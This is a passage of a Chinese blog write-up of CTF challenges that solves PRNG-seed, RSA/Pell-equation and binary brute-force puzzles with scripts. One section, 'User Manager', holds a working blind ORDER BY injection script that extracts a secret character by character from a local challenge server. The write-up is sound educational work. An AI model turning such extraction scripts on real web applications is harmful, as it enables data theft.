xor_key[j] for j in range(len(chunk))])</span><br><span class="line"></span><br><span class="line">    # 将结果添加到结果数组</span><br><span class="line">    result_bytes.extend(xored_chunk)</span><br><span class="line"></span><br><span class="line"># 将结果转换为可读文本</span><br><span class="line">print(result_bytes.hex())</span><br><span class="line">decrypted_text = result_bytes.decode(&quot;GBK&quot;)</span><br><span class="line"></span><br><span class="line">print(&quot;Decrypted text:&quot;, decrypted_text)</span><br></pre></td></tr></table></figure>
<p>结果：</p>
<figure>
<img src="/2024/04/30/writeup/image-20240429004438198.png" alt="image-20240429004438198">
<figcaption aria-hidden="true">image-20240429004438198</figcaption>
</figure>
<h2 id="wish">Wish</h2>
<p>分析源码，可以知道需要适当的index和time提高概率，于是在本地测试：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="comment"># 配置目标 URL</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 迭代范围</span></span><br><span class="line">TIME_START = <span class="number">0</span></span><br><span class="line">TIME_END = <span class="number">86399</span>  <span class="comment"># 一天的秒数</span></span><br><span class="line">INDEX_START = <span class="number">0</span></span><br><span class="line">INDEX_END = <span class="number">9</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 存储结果</span></span><br><span class="line">results = []</span><br><span class="line"><span class="built_in">max</span> = <span class="number">0</span></span><br><span class="line">max_time = <span class="number">0</span></span><br><span class="line">max_index = <span class="number">0</span></span><br><span class="line"><span class="comment"># 循环所有可能的时间和索引组合</span></span><br><span class="line"><span class="keyword">for</span> time <span class="keyword">in</span> <span class="built_in">range</span>(TIME_START, TIME_END + <span class="number">1</span>):</span><br><span class="line">    random.seed(time)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">10</span>):</span><br><span class="line">        <span class="comment"># 准备请求数据</span></span><br><span class="line">        payload = &#123;</span><br><span class="line">                <span class="string">&quot;time&quot;</span>:time,</span><br><span class="line">                <span class="string">&quot;index&quot;</span>:<span class="number">1</span></span><br><span class="line">        &#125;</span><br><span class="line">        diff = <span class="built_in">min</span>(<span class="built_in">abs</span>(random.randint(<span class="number">0</span>, <span class="number">1919810</span>) - <span class="number">114514</span>), <span class="number">10000</span>)</span><br><span class="line">        probability = <span class="number">100</span> * (<span class="number">0.1</span>) ** diff</span><br><span class="line">        <span class="keyword">if</span>(probability&gt;<span class="built_in">max</span>):</span><br><span class="line">            <span class="built_in">print</span>(probability,time,i,diff)</span><br><span class="line">            <span class="built_in">max</span>= probability</span><br><span class="line">            max_index = i</span><br><span class="line">            max_time = time</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出结果</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">max</span>,max_time,max_index)</span><br></pre></td></tr></table></figure>
<p>发现time为10693，index为2的时候，概率最大，然后写脚本抽flag。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="comment"># 配置目标 URL</span></span><br><span class="line">BASE_URL = <span class="string">&quot;http://127.0.0.1:60382&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 迭代范围</span></span><br><span class="line">TIME_START = <span class="number">0</span></span><br><span class="line">TIME_END = <span class="number">86399</span>  <span class="comment"># 一天的秒数</span></span><br><span class="line">INDEX_START = <span class="number">0</span></span><br><span class="line">INDEX_END = <span class="number">9</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 存储结果</span></span><br><span class="line">results = []</span><br><span class="line"></span><br><span class="line"><span class="comment"># 循环所有可能的时间和索引组合</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 准备请求数据</span></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;time&quot;</span>: <span class="number">10693</span>,</span><br><span class="line">    <span class="string">&quot;index&quot;</span>: <span class="number">2</span></span><br><span class="line">&#125;</span><br><span class="line">x = requests.get(BASE_URL+<span class="string">&quot;/get_wish_chances&quot;</span>)</span><br><span class="line">count = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line"><span class="comment"># 发送请求到 /wish 端点</span></span><br><span class="line">    x = requests.get(BASE_URL+<span class="string">&quot;/get_wish_chances&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span>(x.json()[<span class="string">&quot;wish_chances&quot;</span>]== <span class="number">0</span>):</span><br><span class="line">        y =requests.get(BASE_URL+<span class="string">&quot;/query_reset&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span>(y.json()[<span class="string">&quot;message&quot;</span>] != <span class="string">&quot;Wish chances reset successful!&quot;</span>):</span><br><span class="line">            <span class="built_in">print</span>(y.json()[<span class="string">&quot;message&quot;</span>])</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    response = requests.post(BASE_URL + <span class="string">&quot;/wish&quot;</span>, json=payload)</span><br><span class="line">    d = response.json()</span><br><span class="line">    count += <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(count)</span><br><span class="line">    <span class="built_in">print</span>(d)</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> d):</span><br><span class="line">        <span class="built_in">print</span>(d[<span class="string">&quot;flag&quot;</span>])</span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>顺利拿到flag</p>
<figure>
<img src="/2024/04/30/writeup/屏幕截图%202024-04-28%20202602.png" alt="屏幕截图 2024-04-28 202602">
<figcaption aria-hidden="true">屏幕截图 2024-04-28 202602</figcaption>
</figure>
<h2 id="smoke-hints">Smoke hints</h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">114514 * x**2 - 11680542514 * y**2 + 1919810== 2034324</span><br></pre></td></tr></table></figure>
<p>左右两边同时除以114514，可以整除，除后是一个佩尔方程，利用在线网站解一下得到x，y。</p>
<p>根据n = pq，和hint5解出p和q。得到phi_n。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hint2 = (reduce(<span class="keyword">lambda</span> x, y: x * y,<span class="built_in">range</span>(<span class="number">1</span> ,hint1 - <span class="number">1</span>)) * e) % hint1</span><br></pre></td></tr></table></figure>
<p>hint1是质数，所以（hint1-1）！=1 mod hint1，也就是e = hint2 mod hint1
。循环遍历一下e，根据phi_n和e得到d，再利用hint4检验e的正确性，得到e。最后利用pow(c,d,n)完成解密，得到flag。</p>
<p>代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">from functools import reduce</span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line">import cmath</span><br><span class="line">import sympy as sp</span><br><span class="line"></span><br><span class="line">def solve_quadratic(a, b, c):</span><br><span class="line">    if a == 0:</span><br><span class="line">        raise ValueError(&quot;a cannot be zero in a quadratic equation.&quot;)</span><br><span class="line"></span><br><span class="line">    # 判别式</span><br><span class="line">    discriminant = b**2 - 4*a*c</span><br><span class="line">    </span><br><span class="line">    # 两个根</span><br><span class="line">    root1 = (-b + sp.sqrt(discriminant)) / (2*a)</span><br><span class="line">    root2 = (-b - sp.sqrt(discriminant)) / (2*a)</span><br><span class="line">    </span><br><span class="line">    return root1, root2</span><br><span class="line"># Given hint values</span><br><span class="line">hint1 =   227663</span><br><span class="line">hint2 =  137337</span><br><span class="line"></span><br><span class="line"># Finding e by iterating through possible values</span><br><span class="line">&quot;&quot;&quot;factorial_mod = 1</span><br><span class="line">for i in range(1, hint1-1):</span><br><span class="line">    factorial_mod = (factorial_mod * i) % hint1</span><br><span class="line"></span><br><span class="line"># Brute force e</span><br><span class="line">for e in range(1, hint1):</span><br><span class="line">    if (factorial_mod * e) % hint1 == hint2:</span><br><span class="line">        print(&quot;Found e:&quot;, e)</span><br><span class="line">        print(factorial_mod)</span><br><span class="line">        #print((reduce(lambda x, y: x * y,range(1 ,hint1 - 1)) * e) % hint1)</span><br><span class="line">        break&quot;&quot;&quot;</span><br><span class="line"># Given hint3 and n</span><br><span class="line">hint3 =   108570155294949883771125165977701190720515162370315035579630590363494404540536</span><br><span class="line">n = 167354588331422423496795872106297143108909793742527871699155416920731522903485473942317581741798373393735062713015065503589572402294784490098956429946499572446066588321908061091827485460469921210561997788913686347907514912973921126130912247454522851091133065781622270231110993239676739287532598964296053857349</span><br><span class="line"># Calculate the possible p</span><br><span class="line">p_high = hint3</span><br><span class="line">x = 34834945635419823491817566563399234823053176449889821571800075702352062905044231520196782430564993617886316750841220280683153456634693274516582390418863033711415731372881163288179660369032440262647344962570809308551786423557604581792293023628226671539671001863522824415876161727357840363896909435994314597682318687286109212360132261705780761350223208855493439905713509683216585447535669179103840355151676900348955850726834778558748576176596609474037298456423607570516459873639794526160082489103786303332253388597560031538949333472681857144605196440020688999368156212067614295618998719682195870452330682061061500341728481458877113934526003865064359452801</span><br><span class="line">y = 109071911012732502022850422978096246932142152916423367258339958080776017127779842287569032054094868715662547617710798972237860865468979518796870762466053422806566269221859683504667443154145089120448705028998733329483536176859312788275313407342047772524898407149610870586148015013605624329594138230714119704939505401061380777712216157719510271261619101362035144616187262082302740411574934586360516695062056563100258177611076242927354475633328163841594305884855770651187471060662561145818768319723133613889115397679168254599526858767478331211008997427364431641348477558436549415894985022330773540762573918592860707967250624976183104841257499345937186160</span><br><span class="line">x *= x</span><br><span class="line">y *= y</span><br><span class="line">hint4 =  940157148736495569536948133942523184896533749963724663146713839574499759381</span><br><span class="line">hint5 =   15255418698765240148986123763461618105364590424377275486721167711807291089357688467679928674041169614021797058383469840521561574934203173743022803676233460808618030511480966129905318455012614675749110631120373414040004400760684269517059923941301511613235384267940157156620427211268716676040770132158457228306879465155248552079821026941989731097541219611374625189721774741997157027733023307951142218355961436811345966544710547204728419690519386285065828509276989390978557876134181521884640967358205584266798119093588242940831327572982084086899145725432632644480497931095203922121055765105106235444779294128605867814355673756259844317524883293371477161110080126546125749646501058404189810214038447364547023002617022572489049100421496810271019103730786784480066988738233375093501667822681596769424836406702420502168196307313280916421732274269226380885487261960947115233510644610150665250665448670726816467179424442269405760147992070817088128143024275172013222627303928938295282834431922734675826608766787737233866675401405636540270787110086937930200534480064413439278446649638419901101903146170672824392494511142482024840493260842001241499043228132616916760910901838559654850494794452190147603676290926647556776418123194293420698482917217871823657381688092900277785939755218500161749426750884582518269159875982666470631566264463133736616056223597535035601239152289573514143870021685740588489038952712252751349422798310875991680292120049952327023049439762732117139</span><br><span class="line"># Iterate through the possible lower 256 bits to find correct p</span><br><span class="line">count = 0</span><br><span class="line">q = 13312152215055677548331504727709507983929480180124528739872188069103133755405000336069814393189173440677937787731511962617082746944422662051526980597896391</span><br><span class="line">p = n // q</span><br><span class="line">print(p)</span><br><span class="line">print(p*q == n)</span><br><span class="line">#q1,q2 = solve_quadratic(y,-hint5,x*n)</span><br><span class="line">#print(q1)</span><br><span class="line">#print(q2)</span><br><span class="line">#print(q1,q2)</span><br><span class="line">phi_n = (p - 1) * (q - 1)</span><br><span class="line">e = hint2</span><br><span class="line">while 1:</span><br><span class="line">    e += hint1</span><br><span class="line">    if(gmpy2.gcd(e,phi_n) == 1):</span><br><span class="line">        print(e)</span><br><span class="line">        break</span><br><span class="line">def get_e(argu):</span><br><span class="line">    e = argu</span><br><span class="line">    while 1:</span><br><span class="line">        e += hint1</span><br><span class="line">        if(gmpy2.gcd(e,phi_n) == 1):</span><br><span class="line">            print(e)</span><br><span class="line">            return e</span><br><span class="line"># Calculate d</span><br><span class="line">d = 0</span><br><span class="line">count = 0</span><br><span class="line">while (d % (2 ** (d.bit_length() // 4)) != hint4) :</span><br><span class="line">    count += 1</span><br><span class="line">    e = get_e(e)</span><br><span class="line">    d = gmpy2.invert(e, phi_n)</span><br><span class="line">    #if count == 5:</span><br><span class="line">        #break</span><br><span class="line"># Given ciphertext</span><br><span class="line">c =  4591655298782941779230603779929227835355474956856517426189052995763467398501790715234508249166008586471112393807282770568858528888925426802490600451722206237595514262096656163497830669610345277567228647270340495728176112048817647947016356807602866854072843752375203303218894208512798385396685644288817496778</span><br><span class="line"># Decrypt</span><br><span class="line">m = pow(c, d, n)</span><br><span class="line"></span><br><span class="line"># Convert to bytes</span><br><span class="line">flag = long_to_bytes(m)</span><br><span class="line">print(&quot;Flag:&quot;, flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="user-manager">User Manager</h2>
<p>不断创建新用户包含secret的新用户，利用二分法找出flag</p>
<p>代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">flag = &quot;W4terCTF&#123;Dl5CoveR_thE_hIDdEn_F1ag_by_BIInD_1nJECTIN6_iN70_7He_u530&quot;</span><br><span class="line">flag1 = &quot;W4terCTF&#123;Dl5CoveRZ0&quot;</span><br><span class="line">data = &#123;</span><br><span class="line">    #&quot;id&quot;:2,</span><br><span class="line">    &quot;name&quot;: &quot;new&quot;,</span><br><span class="line">    &quot;age&quot;:46,</span><br><span class="line">    &quot;secret&quot;:flag</span><br><span class="line">&#125;</span><br><span class="line">s = &quot;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz&#123;&#125;&quot;</span><br><span class="line">def find_max_less_than_target(arr,id):</span><br><span class="line">    &quot;&quot;&quot;在有序数组中找到小于目标值的最大值&quot;&quot;&quot;</span><br><span class="line">    global flag</span><br><span class="line">    global data</span><br><span class="line">    left = 0</span><br><span class="line">    right = len(arr) - 1</span><br><span class="line">    max_less_than_target = None  # 记录小于目标值的最大值</span><br><span class="line"></span><br><span class="line">    while left &lt;= right:</span><br><span class="line">        mid = (left + right) // 2</span><br><span class="line">        mid_value = arr[mid]</span><br><span class="line">        flag = list(flag)</span><br><span class="line">        flag[-1] = mid_value</span><br><span class="line">        flag = &#x27;&#x27;.join(flag)</span><br><span class="line">        data[&quot;secret&quot;] = flag</span><br><span class="line">        x = requests.post(&quot;http://127.0.0.1:61090/users&quot;,json=data)</span><br><span class="line">        z = requests.delete(f&quot;http://127.0.0.1:61090/users/&#123;id&#125;&quot;)</span><br><span class="line">        id += 1</span><br><span class="line">        y = requests.get(&quot;http://127.0.0.1:61090/users?order_by=secret%20ASC&quot;)</span><br><span class="line">        time.sleep(0.1)</span><br><span class="line">        if y.json()[1][&quot;ID&quot;] == 1:</span><br><span class="line">            # 更新最大值并继续向右查找</span><br><span class="line">            max_less_than_target = mid_value</span><br><span class="line">            left = mid + 1</span><br><span class="line">        else:</span><br><span class="line">            # 如果中间值大于或等于目标值，向左查找</span><br><span class="line">            right = mid - 1</span><br><span class="line">    flag = list(flag)</span><br><span class="line">    flag[-1] = max_less_than_target</span><br><span class="line">    flag = &#x27;&#x27;.join(flag)</span><br><span class="line">    return id</span><br><span class="line">#x = requests.post(&quot;http://127.0.0.1:61090/users&quot;,json=data)</span><br><span class="line">&quot;&quot;&quot;z = requests.delete(&quot;http://127.0.0.1:61090/users/27&quot;)</span><br><span class="line">y = requests.get(&quot;http://127.0.0.1:61090/users?order_by=secret%20ASC&quot;)</span><br><span class="line">if x.status_code == 200:</span><br><span class="line">    print(&quot;POST 请求成功！&quot;)</span><br><span class="line">    print(&quot;响应数据：&quot;, x.json()) </span><br><span class="line"></span><br><span class="line">print(y.json())&quot;&quot;&quot;</span><br><span class="line">id = 15</span><br><span class="line">while flag[len(flag)-2] != &#x27;&#125;&#x27;:</span><br><span class="line">    id = find_max_less_than_target(s,id)</span><br><span class="line">    print(flag)</span><br><span class="line">    flag += &quot;0&quot;</span><br><span class="line">print(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="bruteforceme">BruteforceMe</h2>
<p>丢到IDA反汇编</p>
<figure>
<img src="/2024/04/30/writeup/image-20240429014104492.png" alt="image-20240429014104492">
<figcaption aria-hidden="true">image-20240429014104492</figcaption>
</figure>
<p>观察一下main函数，发现是把输入的字符串由43个字节转换为60个，之后在sub_1650中再经过一些变换，看一下sub_1290函数</p>
<figure>
<img src="/2024/04/30/writeup/image-20240429014202401.png" alt="image-20240429014202401">
<figcaption aria-hidden="true">image-20240429014202401</figcaption>
</figure>
<p>发现就是把每三个字节换成了四个字节。于是按三个字节一组暴力循环，通过输出的数字进行判断。</p>
<p>代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">import subprocess</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line"># 指定可执行文件的路径</span><br><span class="line">executable_path = &#x27;/home/xxww/Downloads/BruteforceMe&#x27;</span><br><span class="line">flag = &quot;***************&quot;</span><br><span class="line">flag = list(flag)</span><br><span class="line">flag[0] = &quot;W4t&quot;</span><br><span class="line">flag[1] = &quot;erC&quot;</span><br><span class="line">flag[2] = &quot;TF&#123;&quot;</span><br><span class="line">def test(flag):</span><br><span class="line">    # 启动进程，并打开stdin/stdout/stderr管道</span><br><span class="line">    process = subprocess.Popen(</span><br><span class="line">        [executable_path],  # 可执行文件的路径</span><br><span class="line">        stdin=subprocess.PIPE,  # 标准输入</span><br><span class="line">        stdout=subprocess.PIPE,  # 标准输出</span><br><span class="line">        stderr=subprocess.PIPE,  # 标准错误</span><br><span class="line">        text=True,  # 将输出作为文本处理</span><br><span class="line">    )</span><br><span class="line">    # 向可执行文件发送输入</span><br><span class="line">    if process.stdin:</span><br><span class="line">        process.stdin.write(flag+&quot;\n&quot;)  # 写入数据并发送换行符</span><br><span class="line">        process.stdin.flush()  # 刷新输入流</span><br><span class="line"></span><br><span class="line">    # 读取输出</span><br><span class="line">    stdout_lines = []</span><br><span class="line">    stderr_lines = []</span><br><span class="line"></span><br><span class="line">    # 等待一段时间，以便可执行文件处理输入并输出结果</span><br><span class="line">    #time.sleep(1)</span><br><span class="line"></span><br><span class="line">    # 读取标准输出</span><br><span class="line">    if process.stdout:</span><br><span class="line">        stdout_lines = process.stdout.readlines()</span><br><span class="line"></span><br><span class="line">    stdout_lines = stdout_lines[0]</span><br><span class="line">    lines = stdout_lines.split()</span><br><span class="line">    return int(lines[3])</span><br><span class="line"></span><br><span class="line">    # 确保进程已完成</span><br><span class="line">    process.wait()</span><br><span class="line"></span><br><span class="line">s = &quot;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz&#123;&#125;&quot;</span><br><span class="line">may_char = []</span><br><span class="line">def get_byte(index):</span><br><span class="line">    num = 0</span><br><span class="line">    first = []</span><br><span class="line">    for i in range(len(s)):</span><br><span class="line">        flag = index*&quot;*&quot;+s[i]+(42-index)*&quot;*&quot;</span><br><span class="line">        new_num = test(flag)</span><br><span class="line">        if new_num == num:</span><br><span class="line">            first.append(s[i])</span><br><span class="line">        elif new_num &gt; num:</span><br><span class="line">            first.clear()</span><br><span class="line">            num = new_num</span><br><span class="line">            first.append(s[i])</span><br><span class="line">    return first</span><br><span class="line">def get_flag(index):</span><br><span class="line">    global flag</span><br><span class="line">    num = 0</span><br><span class="line">    temp = &quot;&quot;</span><br><span class="line">    res = &quot;&quot;</span><br><span class="line">    first = get_byte(index*3)</span><br><span class="line">    print(first)</span><br><span class="line">    second = get_byte(index*3+1)</span><br><span class="line">    third = get_byte(index*3+2)</span><br><span class="line">    for i in range(len(first)):</span><br><span class="line">        for j in range(len(second)):</span><br><span class="line">            for m in range(len(third)):</span><br><span class="line">                temp = first[i]+second[j]+third[m]</span><br><span class="line">                flag[index] = temp</span><br><span class="line">                temp = &quot;&quot;.join(flag)</span><br><span class="line">                temp += (43-len(temp))*&quot;*&quot;</span><br><span class="line">                new_num = test(temp)</span><br><span class="line">                if new_num &gt; num:</span><br><span class="line">                    num = new_num</span><br><span class="line">                    res = first[i]+second[j]+third[m]</span><br><span class="line">                    print(res)</span><br><span class="line">    return res</span><br><span class="line">for i in range(0,14):</span><br><span class="line">    res = get_flag(i)</span><br><span class="line">    flag[i] = res</span><br><span class="line">    print(res)</span><br><span class="line">print(&quot;&quot;.join(flag))</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure>
<img src="/2024/04/30/writeup/image-20240429014620062.png" alt="image-20240429014620062">
<figcaption aria-hidden="true">image-20240429014620062</figcaption>
</figure>

    </div>

    
    
    
        

<div>
<ul class="post-copyright">
  <li class="post-copyright-author">
    <strong>Post author:  </strong>doovvv
  </li>
  <li class="post-copyright-link">
    <strong>Post link: </strong>
    <a href="http://example.com/2024/04/30/writeup/" title="C4terCTF 2024">http://example.com/2024/04/30/writeup/</a>
  </li>
  <li class="post-copyright-license">
    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
  </li>
</ul>
</div>


      <footer class="post-footer">

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2024/03/25/C-Notes/" rel="prev" title="C++ Notes">
      <i class="fa fa-chevron-left"></i> C++ Notes
    </a></div>
      <div class="post-nav-item">
    <a href="/2024/05/22/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6/" rel="next" title="计算机图形学">
      计算机图形学 <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          
    <div class="comments" id="valine-comments"></div>

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
